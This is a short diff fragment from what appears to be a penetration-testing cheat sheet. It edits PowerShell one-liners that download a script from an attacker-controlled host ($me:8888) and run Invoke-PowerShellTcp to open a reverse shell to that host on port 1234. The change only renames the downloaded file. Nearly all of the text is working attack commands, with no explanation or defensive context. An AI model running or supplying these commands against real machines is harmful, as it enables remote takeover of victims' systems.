@@ -9,6 +9,6 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://$me:8888/Invoke
 Or the same but in stages
 
 ```powershell
-powershell (New-Object Net.WebClient).Downloadfile('http://$me:8888/rev.ps1')
-powershell Import-Module ./rev.ps1; Invoke-PowershellTcp -Reverse -IPAddress $me -Port 1234
+powershell (New-Object Net.WebClient).Downloadfile('http://$me:8888/Invoke-PowerShellTcp.ps1')
+powershell Import-Module ./Invoke-PowerShellTcp.ps1; Invoke-PowershellTcp -Reverse -IPAddress $me -Port 1234
 ```
